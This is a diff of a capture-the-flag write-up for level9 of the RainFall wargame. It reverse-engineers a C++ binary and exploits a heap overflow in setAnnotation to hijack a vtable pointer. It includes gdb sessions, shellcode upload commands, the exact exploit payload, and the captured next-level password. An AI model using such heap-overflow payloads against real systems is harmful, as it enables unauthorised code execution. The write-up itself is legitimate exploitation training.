@@ -1,34 +1,67 @@
-The disassembly of this level the result of the compilation of  a OO style programming language, most likely C++.
+The disassembly of this level is the result of the compilation of a OO style programming language, most likely C++.
 
 First the main checks if there is some args, else it exits.
 
 ...
-0x080485fe      var = dword [arg_8h] - 1
-0x08048602      if (var > 0) goto 0x8048610
-0x08048604      dword [esp] = 1
-0x0804860b      sym.imp._exit ()
-0x08048610      dword [esp] = 0x6c
+ 80485fe:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
+ 8048602:	7f 0c                	jg     8048610 <main+0x1c>
+ 8048604:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
+ 804860b:	e8 e0 fe ff ff       	call   80484f0 <_exit@plt>
+ 8048610:	c7 04 24 6c 00 00 00 	mov    DWORD PTR [esp],0x6c
 ...
 
 Followed by this process twice :
 
-generate a new unsigned int
+generate a new "uint" (which is a struct of size == 108)
 calls n_int on it with a fixed value
 	>takes the uint pointer and a value
-	>calls fcn_0804873a, stores the result in our uint[0]
-		>takes the uint pointer and a value
-		>adds to *(&value + 0x68) the value in *(pointer + 0x68)
-		>returns *(pointer + 0x68)
-	>sets the value of *(pointer + 0x68) to our value
-	>returns the value
+	>stores the address of the vtable entry of fcn_0804873a  in our uint[0]
+	>takes the uint pointer and a value
+	>adds to *((char*)pointer + 0x68) the value
+	>returns the value (which is discarded anyway)
 
 Then setAnnotation_char is called
 It takes a pointer and argv[1], then memcpy((pointer + 4), argv[1], strlen(argv[1]))
 This is where we have influence on code execution.
-Since the pointer redirects to the address of the first uint generated we can overwrite the second one.
+Since the pointer redirects to the address of the first uint generated, and the mallocs are continuous, we can overwrite the second one.
 Then edx is called, which contains the pointer contained at *second_uint_copy dereferenced.
 When the program executes without memory corruption, its value will always be fcn.0804873a.
 
 The exploit consists in placing a pointer which when dereferenced jumps to our shellcode (placed at the beggining of our exploit string).
-Using gdb we pad until we can write to *second_uint_copy, at this emplacement we write a pointer to the next dword.
+We pad (including the shellcode) for 108 bytes, at this emplacement we write a pointer to the next dword.
 This pointer will invoke bash when called.
+
+We need to figure out the address of *first_uint:
+
+level9@RainFall:~$ gdb --args ./level9 "a"
+[Removed for readability]
+(gdb) b *0x08048733
+Breakpoint 1 at 0x8048733
+(gdb) run
+Starting program: /home/user/level9/level9 a
+
+Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
+(gdb) x/1x $esp
+0xbffff6e0:	0x0804a00c
+
+So the address of *first_uint is 0x0804a00c
+As the mallocs are continuous, we will find *second_uint 6c = 108 bytes later, so at 0x0804a078, the address of the next dword is 0x0804a07c
+Therefore, if we write at 0x0804a078 the address 0x0804a07c, through 2 deferencing, we'll get 0x0804a00c which is the address first_uint as well as the address of our shellcode, which will be called.
+
+
+We assemble our shellcode:
+
+nasm ./ressources/shellcode.asm
+[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level8/flag | clipboard ; scp -P 4242 ./ressources/shellcode level9@rainfall:/tmp
+
+cat /tmp/shellcode > /tmp/input
+python -c 'import sys; sys.stdout.write("B" * 82);' >> /tmp/input
+echo -ne '\x7C\xA0\x04\x08' >> /tmp/input
+echo -ne '\x0C\xA0\x04\x08' >> /tmp/input
+./level9 "`cat /tmp/input`"
+
+level9@RainFall:~$ ./level9 "`cat /tmp/input`"
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
